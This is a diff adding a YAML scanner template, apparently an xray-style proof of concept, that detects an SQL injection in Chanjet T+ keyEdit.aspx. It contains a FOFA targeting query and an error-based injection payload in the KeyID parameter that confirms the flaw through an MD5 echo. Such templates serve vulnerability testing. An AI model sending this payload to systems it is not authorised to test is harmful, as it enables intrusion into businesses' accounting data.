@@ -1,0 +1,24 @@
+id: poc-yaml-changjie-tplus-keyedit-aspx-sqli
+info:
+  name: 畅捷通T+ keyEdit.aspx SQL注入漏洞
+  severity: high
+  tags:
+  - sql-injection
+  finger: 畅捷通T+
+  fofa: app="畅捷通-TPlus"
+variables:
+  t1: random_int(1000,10000)
+  t2: md5(t1)
+requests:
+- method: GET
+  path: /tplus/UFAQD/keyEdit.aspx?KeyID=1%27%20and%201=(select%20sys.fn_varbintohexstr(hashbytes(%27MD5%27,%27{{.t1}}%27)))%20--&preload=1
+  expression: 'status_code == 500 &&
+
+    contains(title,"在将 nvarchar 值") &&
+
+    contains(title,t2) &&
+
+    contains(title,"转换成数据类型 int 时失败")
+
+    '
+transport: http
